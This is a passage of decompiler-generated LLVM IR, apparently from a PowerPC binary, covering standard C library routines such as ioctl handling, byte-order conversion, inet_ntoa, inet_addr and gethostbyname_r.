  store i32 %v2_1000eeb8, i32* %stack_var_-72, align 4
  store i32 268496644, i32* @lr, align 4
  %v0_1000ef00 = call i32 @memcpy()
  %v0_1000ef04 = load i32, i32* @r27, align 4
  %v0_1000ef08 = load i32, i32* @r30, align 4
  store i32 268496664, i32* @lr, align 4
  %v3_1000ef14 = call i32 @ioctl(i32 %v0_1000ef04, i32 %v0_1000ef08, i32 %v2_1000eed4)
  store i32 %v3_1000ef14, i32* @r28, align 4
  %v3_1000ef18 = icmp eq i32 %v3_1000ef14, 0
  br i1 %v3_1000ef18, label %dec_label_pc_1000ef20, label %dec_label_pc_1000efa0

dec_label_pc_1000ef20:                            ; preds = %dec_label_pc_1000eeb8
  %v0_1000ef20 = load i32, i32* @r30, align 4
  %v3_1000ef24 = icmp eq i32 %v0_1000ef20, -2144570348
  br i1 %v3_1000ef24, label %dec_label_pc_1000ef2c, label %dec_label_pc_1000ef9c

dec_label_pc_1000ef2c:                            ; preds = %dec_label_pc_1000ef20
  %v0_1000ef2c = call i32 @__errno_location()
  store i32 %v0_1000ef2c, i32* @r29, align 4
  %v0_1000ef3c = load i32, i32* @r27, align 4
  %v1_1000ef44 = inttoptr i32 %v0_1000ef2c to i32*
  %v2_1000ef44 = load i32, i32* %v1_1000ef44, align 4
  store i32 %v2_1000ef44, i32* @r30, align 4
  store i32 268496720, i32* @lr, align 4
  %v3_1000ef4c = call i32 @ioctl(i32 %v0_1000ef3c, i32 1076655123, i32 %v2_1000eed4)
  %v3_1000ef50 = icmp eq i32 %v3_1000ef4c, 0
  br i1 %v3_1000ef50, label %dec_label_pc_1000ef60, label %dec_label_pc_1000ef58

dec_label_pc_1000ef58:                            ; preds = %dec_label_pc_1000ef2c
  %v0_1000ef58 = load i32, i32* @r30, align 4
  %v1_1000ef58 = load i32, i32* @r29, align 4
  %v2_1000ef58 = inttoptr i32 %v1_1000ef58 to i32*
  store i32 %v0_1000ef58, i32* %v2_1000ef58, align 4
  br label %dec_label_pc_1000efa0

dec_label_pc_1000ef60:                            ; preds = %dec_label_pc_1000ef2c
  %v0_1000ef60 = load i32, i32* @r31, align 4
  %v1_1000ef60 = add i32 %v0_1000ef60, 8
  %v2_1000ef60 = inttoptr i32 %v1_1000ef60 to i32*
  %v3_1000ef60 = load i32, i32* %v2_1000ef60, align 4
  %v1_1000ef68 = call i32 @__asm_rlwinm(i32 %v3_1000ef60, i32 0, i32 19, i32 20)
  %v1_1000ef6c = call i32 @__asm_rlwinm(i32 %v3_1000eec8, i32 0, i32 19, i32 20)
  store i32 %v1_1000ef6c, i32* %r9.global-to-local, align 4
  %v4_1000ef70 = icmp eq i32 %v1_1000ef68, %v1_1000ef6c
  br i1 %v4_1000ef70, label %dec_label_pc_1000ef78, label %dec_label_pc_1000ef8c

dec_label_pc_1000ef78:                            ; preds = %dec_label_pc_1000ef60
  %v1_1000ef78 = and i32 %v3_1000ef60, 768
  store i32 %v1_1000ef78, i32* %r9.global-to-local, align 4
  %v3_1000ef78 = icmp eq i32 %v1_1000ef78, 0
  br i1 %v3_1000ef78, label %dec_label_pc_1000ef9c, label %dec_label_pc_1000ef80

dec_label_pc_1000ef80:                            ; preds = %dec_label_pc_1000ef78
  %v1_1000ef80 = call i32 @__asm_rlwinm(i32 %v3_1000eec8, i32 0, i32 22, i32 23)
  %v0_1000ef84 = load i32, i32* %r9.global-to-local, align 4
  %v4_1000ef84 = icmp eq i32 %v0_1000ef84, %v1_1000ef80
  br i1 %v4_1000ef84, label %dec_label_pc_1000ef9c, label %dec_label_pc_1000ef8c

dec_label_pc_1000ef8c:                            ; preds = %dec_label_pc_1000ef60, %dec_label_pc_1000ef80
  store i32 -1, i32* @r28, align 4
  %v1_1000ef94 = load i32, i32* @r29, align 4
  %v2_1000ef94 = inttoptr i32 %v1_1000ef94 to i32*
  store i32 22, i32* %v2_1000ef94, align 4
  br label %dec_label_pc_1000efa0

dec_label_pc_1000ef9c:                            ; preds = %dec_label_pc_1000ef20, %dec_label_pc_1000ef80, %dec_label_pc_1000ef78
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000efa0

dec_label_pc_1000efa0:                            ; preds = %dec_label_pc_1000eeb8, %dec_label_pc_1000ef58, %dec_label_pc_1000ee9c, %dec_label_pc_1000ef8c, %dec_label_pc_1000ef9c
  %v0_1000efa4 = load i32, i32* @r28, align 4
  ret i32 %v0_1000efa4

; uselistorder directives
  uselistorder i32 %v0_1000ee6c, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 3 }
  uselistorder i32 19, { 5, 6, 7, 0, 8, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1000efa0, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_1000ef9c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000ef8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000eeb8, { 2, 1, 0 }
}

define i32 @ntohl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1000efb8 = load i32, i32* @r3, align 4
  ret i32 %v0_1000efb8
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_1000efbc = load i32, i32* @r3, align 4
  ret i32 %v0_1000efbc
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000efc0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000efc0
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1000efc4 = load i32, i32* @r3, align 4
  ret i32 %v0_1000efc4
}

define i32 @__GI_inet_ntoa_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_1000efd0 = add i32 %arg2, 15
  store i32 %v1_1000efd0, i32* %r4.global-to-local, align 4
  %v2_1000efe4 = load i32, i32* %arg1, align 4
  store i32 %v2_1000efe4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000efec

dec_label_pc_1000efec:                            ; preds = %dec_label_pc_1000f010.dec_label_pc_1000efec_crit_edge, %entry
  %v0_1000efec = phi i32 [ %v2_1000efe4, %entry ], [ %v0_1000efec.pre, %dec_label_pc_1000f010.dec_label_pc_1000efec_crit_edge ]
  %v0_1000f0308 = phi i32 [ %v1_1000efd0, %entry ], [ %v0_1000f010, %dec_label_pc_1000f010.dec_label_pc_1000efec_crit_edge ]
  %v1_1000efec = urem i32 %v0_1000efec, 256
  %v5_1000eff4 = inttoptr i32 %v0_1000f0308 to i8*
  %v6_1000eff4 = call i32 @_uintmaxtostr(i8* %v5_1000eff4, i32 0, i32 %v1_1000efec, i32 -10, i32 0)
  %v0_1000eff8 = load i32, i32* @r30, align 4
  %v3_1000eff8 = icmp eq i32 %v0_1000eff8, 0
  %v0_1000effc = load i32, i32* @r31, align 4
  %v1_1000effc = udiv i32 %v0_1000effc, 256
  store i32 %v1_1000effc, i32* %r31.global-to-local, align 4
  %v1_1000f000 = add i32 %v6_1000eff4, -1
  store i32 %v1_1000f000, i32* %r4.global-to-local, align 4
  br i1 %v3_1000eff8, label %dec_label_pc_1000f010, label %dec_label_pc_1000f008

dec_label_pc_1000f008:                            ; preds = %dec_label_pc_1000efec
  %v3_1000f00c = inttoptr i32 %v0_1000eff8 to i8*
  store i8 46, i8* %v3_1000f00c, align 1
  %v0_1000f010.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000f010

dec_label_pc_1000f010:                            ; preds = %dec_label_pc_1000efec, %dec_label_pc_1000f008
  %v0_1000f010 = phi i32 [ %v1_1000f000, %dec_label_pc_1000efec ], [ %v0_1000f010.pre, %dec_label_pc_1000f008 ]
  %v0_1000f014.pre = load i32, i32* @r29, align 4
  %v1_1000f024 = add i32 %v0_1000f014.pre, 1
  store i32 %v1_1000f024, i32* @r29, align 4
  %tmp7 = icmp slt i32 %v0_1000f014.pre, 4
  br i1 %tmp7, label %dec_label_pc_1000f010.dec_label_pc_1000efec_crit_edge, label %dec_label_pc_1000f02c

dec_label_pc_1000f010.dec_label_pc_1000efec_crit_edge: ; preds = %dec_label_pc_1000f010
  %v0_1000efec.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000efec

dec_label_pc_1000f02c:                            ; preds = %dec_label_pc_1000f010
  %v1_1000f030 = add i32 %v0_1000f010, 1
  ret i32 %v1_1000f030

; uselistorder directives
  uselistorder i32 %v0_1000f014.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000f010, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_1000f058 = load i32, i32* %arg1, align 4
  store i32 %v2_1000f058, i32* %stack_var_-8, align 4
  store i32 268497000, i32* @lr, align 4
  %v3_1000f064 = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_1002e650.623 to i32))
  ret i32 %v3_1000f064
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000f080 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000f080, i32* @r4, align 4
  store i32 268497036, i32* @lr, align 4
  %v1_1000f088 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000f088 = call i32 @inet_aton(i8* %v1_1000f088)
  %v3_1000f08c = icmp eq i32 %v2_1000f088, 0
  br i1 %v3_1000f08c, label %dec_label_pc_1000f09c, label %dec_label_pc_1000f098

dec_label_pc_1000f098:                            ; preds = %entry
  %v3_1000f098 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000f09c

dec_label_pc_1000f09c:                            ; preds = %entry, %dec_label_pc_1000f098
  %v0_1000f0a8 = phi i32 [ -1, %entry ], [ %v3_1000f098, %dec_label_pc_1000f098 ]
  ret i32 %v0_1000f0a8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f09c, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000f0c0 = call i32 @__GI___h_errno_location()
  %v2_1000f0d0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268497128, i32* @lr, align 4
  %v7_1000f0e4 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_1002e82c.624, i32 ptrtoint (i32* @global_var_1002e660.625 to i32), i32 460, i32 %v2_1000f0d0, i32 %v0_1000f0c0)
  %v3_1000f0ec = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000f0ec
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000f104 = load i32, i32* @lr, align 4
  store i32 %v0_1000f104, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000f10c = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000f12c = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000f12c, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000f10c, label %dec_label_pc_1000f430, label %dec_label_pc_1000f138

dec_label_pc_1000f138:                            ; preds = %entry
  %v0_1000f138 = call i32 @__errno_location()
  store i32 %v0_1000f138, i32* %r3.global-to-local, align 4
  %v1_1000f140 = inttoptr i32 %v0_1000f138 to i32*
  %v2_1000f140 = load i32, i32* %v1_1000f140, align 4
  store i32 %v2_1000f140, i32* @r27, align 4
  store i32 %v0_1000f138, i32* %r28.global-to-local, align 4
  %v0_1000f148 = load i32, i32* @r31, align 4
  store i32 %v0_1000f148, i32* %v1_1000f140, align 4
  %v0_1000f14c = load i32, i32* %r26.global-to-local, align 4
  %v0_1000f150 = load i32, i32* @r23, align 4
  store i32 %v0_1000f150, i32* %r3.global-to-local, align 4
  %v0_1000f154 = load i32, i32* %r30.global-to-local, align 4
  %v0_1000f158 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000f15c = load i32, i32* %r20.global-to-local, align 4
  %v0_1000f160 = load i32, i32* @r24, align 4
  store i32 268497256, i32* @lr, align 4
  %v7_1000f164 = call i32 @__get_hosts_byname_r(i32 %v0_1000f150, i32 2, i32 %v0_1000f14c, i32 %v0_1000f154, i32 %v0_1000f158, i32 %v0_1000f15c, i32 %v0_1000f160)
  store i32 %v7_1000f164, i32* %r3.global-to-local, align 4
  %v3_1000f168 = icmp eq i32 %v7_1000f164, 0
  br i1 %v3_1000f168, label %dec_label_pc_1000f430, label %dec_label_pc_1000f170

dec_label_pc_1000f170:                            ; preds = %dec_label_pc_1000f138
  %v0_1000f170 = load i32, i32* @r24, align 4
  %v1_1000f170 = inttoptr i32 %v0_1000f170 to i32*
  %v2_1000f170 = load i32, i32* %v1_1000f170, align 4
  store i32 %v2_1000f170, i32* %r0.global-to-local, align 4
  %v3_1000f174 = icmp eq i32 %v2_1000f170, 1
  br i1 %v3_1000f174, label %dec_label_pc_1000f198, label %dec_label_pc_1000f17c

dec_label_pc_1000f17c:                            ; preds = %dec_label_pc_1000f170
  %v3_1000f17c = icmp eq i32 %v2_1000f170, 4
  br i1 %v3_1000f17c, label %dec_label_pc_1000f198, label %dec_label_pc_1000f184

dec_label_pc_1000f184:                            ; preds = %dec_label_pc_1000f17c
  %v3_1000f184 = icmp eq i32 %v2_1000f170, -1
  br i1 %v3_1000f184, label %dec_label_pc_1000f18c, label %dec_label_pc_1000f430

dec_label_pc_1000f18c:                            ; preds = %dec_label_pc_1000f184
  %v0_1000f18c = load i32, i32* @r28, align 4
  %v1_1000f18c = inttoptr i32 %v0_1000f18c to i32*
  %v2_1000f18c = load i32, i32* %v1_1000f18c, align 4
  store i32 %v2_1000f18c, i32* %r0.global-to-local, align 4
  %v3_1000f190 = icmp eq i32 %v2_1000f18c, 2
  br i1 %v3_1000f190, label %dec_label_pc_1000f198, label %dec_label_pc_1000f430

dec_label_pc_1000f198:                            ; preds = %dec_label_pc_1000f18c, %dec_label_pc_1000f17c, %dec_label_pc_1000f170
  %v0_1000f198 = load i32, i32* @r30, align 4
  %v1_1000f198 = sub i32 0, %v0_1000f198
  store i32 %v1_1000f198, i32* %r0.global-to-local, align 4
  %v0_1000f19c = load i32, i32* @r27, align 4
  %v1_1000f19c = load i32, i32* @r28, align 4
  %v2_1000f19c = inttoptr i32 %v1_1000f19c to i32*
  store i32 %v0_1000f19c, i32* %v2_1000f19c, align 4
  %v0_1000f1a0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f1a0 = urem i32 %v0_1000f1a0, 4
  store i32 %v1_1000f1a0, i32* %r0.global-to-local, align 4
  %v3_1000f1a0 = icmp eq i32 %v1_1000f1a0, 0
  %v0_1000f1b8.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000f1a0, label %dec_label_pc_1000f1b8, label %dec_label_pc_1000f1a8

dec_label_pc_1000f1a8:                            ; preds = %dec_label_pc_1000f198
  %v2_1000f1a8 = icmp ult i32 %v0_1000f1b8.pre, %v1_1000f1a0
  br i1 %v2_1000f1a8, label %dec_label_pc_1000f42c, label %dec_label_pc_1000f1b0

dec_label_pc_1000f1b0:                            ; preds = %dec_label_pc_1000f1a8
  %v2_1000f1b0 = sub i32 %v0_1000f1b8.pre, %v1_1000f1a0
  store i32 %v2_1000f1b0, i32* @r29, align 4
  %v0_1000f1b4 = load i32, i32* @r30, align 4
  %v2_1000f1b4 = add i32 %v0_1000f1b4, %v1_1000f1a0
  store i32 %v2_1000f1b4, i32* @r30, align 4
  br label %dec_label_pc_1000f1b8

dec_label_pc_1000f1b8:                            ; preds = %dec_label_pc_1000f198, %dec_label_pc_1000f1b0
  %v0_1000f1b8 = phi i32 [ %v2_1000f1b0, %dec_label_pc_1000f1b0 ], [ %v0_1000f1b8.pre, %dec_label_pc_1000f198 ]
  %v1_1000f1c0 = load i32, i32* @r24, align 4
  %v2_1000f1c0 = inttoptr i32 %v1_1000f1c0 to i32*
  store i32 -1, i32* %v2_1000f1c0, align 4
  %tmp29 = icmp ult i32 %v0_1000f1b8, 4
  br i1 %tmp29, label %dec_label_pc_1000f42c, label %dec_label_pc_1000f1c8

dec_label_pc_1000f1c8:                            ; preds = %dec_label_pc_1000f1b8
  %v0_1000f1c8 = load i32, i32* @r29, align 4
  %v1_1000f1c8 = add i32 %v0_1000f1c8, -4
  store i32 %v1_1000f1c8, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000f1c8, 8
  br i1 %tmp30, label %dec_label_pc_1000f42c, label %dec_label_pc_1000f1d4

dec_label_pc_1000f1d4:                            ; preds = %dec_label_pc_1000f1c8
  %v1_1000f1d4 = add i32 %v0_1000f1c8, -12
  store i32 %v1_1000f1d4, i32* %r0.global-to-local, align 4
  %v0_1000f1d8 = load i32, i32* @r30, align 4
  %v1_1000f1d8 = add i32 %v0_1000f1d8, 4
  store i32 %v1_1000f1d8, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000f1e4 = inttoptr i32 %v1_1000f1d8 to i32*
  store i32 %v0_1000f1d8, i32* %v3_1000f1e4, align 4
  %v0_1000f1e8 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000f1e8 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000f1e8 = add i32 %v1_1000f1e8, 4
  %v3_1000f1e8 = inttoptr i32 %v2_1000f1e8 to i32*
  store i32 %v0_1000f1e8, i32* %v3_1000f1e8, align 4
  %tmp31 = icmp ult i32 %v1_1000f1d4, 32
  br i1 %tmp31, label %dec_label_pc_1000f42c, label %dec_label_pc_1000f1f0

dec_label_pc_1000f1f0:                            ; preds = %dec_label_pc_1000f1d4
  %v0_1000f1f0 = load i32, i32* @r29, align 4
  %v1_1000f1f0 = add i32 %v0_1000f1f0, -44
  %tmp32 = icmp ult i32 %v1_1000f1f0, 256
  br i1 %tmp32, label %dec_label_pc_1000f42c, label %dec_label_pc_1000f1fc

dec_label_pc_1000f1fc:                            ; preds = %dec_label_pc_1000f1f0
  %v0_1000f1fc = load i32, i32* @r30, align 4
  %v1_1000f1fc = add i32 %v0_1000f1fc, 44
  store i32 %v1_1000f1fc, i32* @r31, align 4
  %v0_1000f200 = load i32, i32* @r23, align 4
  store i32 %v0_1000f200, i32* @r4, align 4
  %v1_1000f208 = add i32 %v0_1000f1fc, 12
  store i32 %v1_1000f208, i32* %r21.global-to-local, align 4
  store i32 %v1_1000f1fc, i32* %r3.global-to-local, align 4
  store i32 268497428, i32* @lr, align 4
  %v3_1000f210 = call i32 @strncpy(i32 %v1_1000f1fc, i32 %v0_1000f200, i32 %v1_1000f1f0)
  %v0_1000f214 = load i32, i32* @r31, align 4
  %v1_1000f214 = load i32, i32* @r30, align 4
  %v2_1000f214 = add i32 %v1_1000f214, 12
  %v3_1000f214 = inttoptr i32 %v2_1000f214 to i32*
  store i32 %v0_1000f214, i32* %v3_1000f214, align 4
  %v0_1000f218 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000f218 = load i32, i32* %r21.global-to-local, align 4
  %v2_1000f218 = add i32 %v1_1000f218, 4
  %v3_1000f218 = inttoptr i32 %v2_1000f218 to i32*
  store i32 %v0_1000f218, i32* %v3_1000f218, align 4
  %v0_1000f21c = load i32, i32* @r23, align 4
  store i32 %v0_1000f21c, i32* %r3.global-to-local, align 4
  %v0_1000f220 = load i32, i32* @r30, align 4
  store i32 %v0_1000f220, i32* @r4, align 4
  store i32 268497448, i32* @lr, align 4
  %v2_1000f224 = inttoptr i32 %v0_1000f21c to i8*
  %v3_1000f224 = call i32 @inet_aton(i8* %v2_1000f224)
  store i32 %v3_1000f224, i32* %r3.global-to-local, align 4
  store i32 %v3_1000f224, i32* %r22.global-to-local, align 4
  %v3_1000f228 = icmp eq i32 %v3_1000f224, 0
  br i1 %v3_1000f228, label %dec_label_pc_1000f25c, label %dec_label_pc_1000f230

dec_label_pc_1000f230:                            ; preds = %dec_label_pc_1000f1fc
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000f238 = load i32, i32* @r26, align 4
  %v2_1000f238 = add i32 %v1_1000f238, 8
  %v3_1000f238 = inttoptr i32 %v2_1000f238 to i32*
  store i32 2, i32* %v3_1000f238, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000f240 = load i32, i32* @r31, align 4
  %v1_1000f240 = load i32, i32* @r26, align 4
  %v2_1000f240 = inttoptr i32 %v1_1000f240 to i32*
  store i32 %v0_1000f240, i32* %v2_1000f240, align 4
  %v0_1000f244 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f244 = load i32, i32* @r26, align 4
  %v2_1000f244 = add i32 %v1_1000f244, 12
  %v3_1000f244 = inttoptr i32 %v2_1000f244 to i32*
  store i32 %v0_1000f244, i32* %v3_1000f244, align 4
  %v0_1000f248 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000f248 = load i32, i32* @r26, align 4
  %v2_1000f248 = add i32 %v1_1000f248, 16
  %v3_1000f248 = inttoptr i32 %v2_1000f248 to i32*
  store i32 %v0_1000f248, i32* %v3_1000f248, align 4
  %v0_1000f24c = load i32, i32* %r21.global-to-local, align 4
  %v1_1000f24c = load i32, i32* @r26, align 4
  %v2_1000f24c = add i32 %v1_1000f24c, 4
  %v3_1000f24c = inttoptr i32 %v2_1000f24c to i32*
  store i32 %v0_1000f24c, i32* %v3_1000f24c, align 4
  %v0_1000f250 = load i32, i32* @r26, align 4
  %v1_1000f250 = load i32, i32* @r20, align 4
  %v2_1000f250 = inttoptr i32 %v1_1000f250 to i32*
  store i32 %v0_1000f250, i32* %v2_1000f250, align 4
  %v0_1000f254 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000f254 = load i32, i32* @r24, align 4
  %v2_1000f254 = inttoptr i32 %v1_1000f254 to i32*
  store i32 %v0_1000f254, i32* %v2_1000f254, align 4
  br label %dec_label_pc_1000f430

dec_label_pc_1000f25c:                            ; preds = %dec_label_pc_1000f1fc
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 268497508, i32* @lr, align 4
  %v0_1000f260 = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_10028538.626 to i32), i32* %r29.global-to-local, align 4
  %v2_1000f268 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000f268, i32* %r28.global-to-local, align 4
  store i32 %v2_1000f268, i32* @r3, align 4
  %v0_1000f27c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_10028538.626 to i32), i32* %r3.global-to-local, align 4
  %v0_1000f284 = call i32 @__pthread_return_0()
  %v3_1000f28c = load i32, i32* @global_var_1002861c.627, align 4
  store i32 %v3_1000f28c, i32* %r29.global-to-local, align 4
  store i32 %v2_1000f268, i32* @r3, align 4
  %v0_1000f298 = call i32 @__pthread_return_void()
  %v0_1000f2a0 = load i32, i32* @r23, align 4
  store i32 %v0_1000f2a0, i32* %r3.global-to-local, align 4
  %v2_1000f2b0 = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000f2b4 = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000f2b8 = load i32, i32* %r22.global-to-local, align 4
  store i32 268497608, i32* @lr, align 4
  %v6_1000f2c4 = inttoptr i32 %v0_1000f2a0 to i8*
  %v7_1000f2c4 = call i32 @__dns_lookup(i8* %v6_1000f2c4, i32 1, i32 %v3_1000f28c, i32 ptrtoint (i32* @global_var_1002e918.628 to i32), i32 %v2_1000f2b0, i32 %v2_1000f2b4)
  store i32 %v7_1000f2c4, i32* %r3.global-to-local, align 4
  %v1_1000f2c8 = icmp slt i32 %v7_1000f2c4, 0
  br i1 %v1_1000f2c8, label %dec_label_pc_1000f410, label %dec_label_pc_1000f2d0

dec_label_pc_1000f2d0:                            ; preds = %dec_label_pc_1000f25c
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000f2d8 = add i32 %tmp19, 4
  %v2_1000f2dc = mul i32 %v0_1000f2b8, %v1_1000f2d8
  %v1_1000f2e0 = add i32 %v2_1000f2dc, 256
  %v1_1000f2e4 = load i32, i32* @r27, align 4
  %v3_1000f2e4 = icmp ugt i32 %v1_1000f2e0, %v1_1000f2e4
  br i1 %v3_1000f2e4, label %dec_label_pc_1000f2ec, label %dec_label_pc_1000f308

dec_label_pc_1000f2ec:                            ; preds = %dec_label_pc_1000f2d0
  %v3_1000f2ec = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000f2ec, i32* @r3, align 4
  store i32 268497652, i32* @lr, align 4
  %v0_1000f2f0 = call i32 @free()
  %v3_1000f2f4 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000f2f4, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000f2fc.629 to i32), i32* @lr, align 4
  %v0_1000f2f8 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000f300 = load i32, i32* @r19, align 4
  %v1_1000f300 = load i32, i32* @r24, align 4
  %v2_1000f300 = inttoptr i32 %v1_1000f300 to i32*
  store i32 %v0_1000f300, i32* %v2_1000f300, align 4
  br label %dec_label_pc_1000f430

dec_label_pc_1000f308:                            ; preds = %dec_label_pc_1000f2d0
  %v3_1000f308 = icmp eq i32 %v0_1000f2b8, 0
  br i1 %v3_1000f308, label %dec_label_pc_1000f308.dec_label_pc_1000f3ac_crit_edge, label %dec_label_pc_1000f310

dec_label_pc_1000f308.dec_label_pc_1000f3ac_crit_edge: ; preds = %dec_label_pc_1000f308
  %v0_1000f3b4.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000f3ac

dec_label_pc_1000f310:                            ; preds = %dec_label_pc_1000f308
  %v2_1000f310 = mul i32 %v0_1000f2b8, %tmp19
  store i32 %v2_1000f310, i32* @r5, align 4
  %v0_1000f314 = load i32, i32* @r30, align 4
  %v1_1000f314 = add i32 %v0_1000f314, 36
  store i32 %v1_1000f314, i32* %r3.global-to-local, align 4
  %v0_1000f318 = load i32, i32* @r31, align 4
  store i32 268497696, i32* @lr, align 4
  %v2_1000f31c = call i32 @memmove(i32 %v1_1000f314, i32 %v0_1000f318)
  store i32 %v2_1000f31c, i32* %r3.global-to-local, align 4
  store i32 %v2_1000f310, i32* %r0.global-to-local, align 4
  %v0_1000f32c = load i32, i32* @r30, align 4
  %v1_1000f32c = load i32, i32* @r31, align 4
  %v3_1000f32c = add i32 %v1_1000f32c, %v2_1000f310
  %v4_1000f32c = inttoptr i32 %v3_1000f32c to i32*
  store i32 %v0_1000f32c, i32* %v4_1000f32c, align 4
  %v0_1000f330 = load i32, i32* @r31, align 4
  %v1_1000f330 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f330 = add i32 %v1_1000f330, %v0_1000f330
  store i32 %v2_1000f330, i32* @r25, align 4
  %v1_1000f338 = add i32 %v0_1000f2b8, -1
  store i32 %v1_1000f338, i32* %r11.global-to-local, align 4
  %v1_1000f33c = add i32 %v0_1000f2b8, 1
  %v2_1000f340 = icmp sgt i32 %v1_1000f338, -1
  store i32 %v1_1000f33c, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000f340, label %dec_label_pc_1000f370.preheader, label %dec_label_pc_1000f34c

dec_label_pc_1000f34c:                            ; preds = %dec_label_pc_1000f310
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f370.preheader

dec_label_pc_1000f370.preheader:                  ; preds = %dec_label_pc_1000f34c, %dec_label_pc_1000f310
  %v0_1000f3786 = phi i32 [ 1, %dec_label_pc_1000f34c ], [ %v1_1000f33c, %dec_label_pc_1000f310 ]
  %v1_1000f3703 = mul i32 %v1_1000f338, 4
  store i32 %v1_1000f3703, i32* %r0.global-to-local, align 4
  %v2_1000f3745 = add i32 %v2_1000f330, %v1_1000f3703
  %v1_1000f3787 = add i32 %v0_1000f3786, -1
  store i32 %v1_1000f3787, i32* %ctr.global-to-local, align 4
  %v2_1000f3788 = icmp eq i32 %v1_1000f3787, 0
  br i1 %v2_1000f3788, label %dec_label_pc_1000f37c, label %dec_label_pc_1000f358

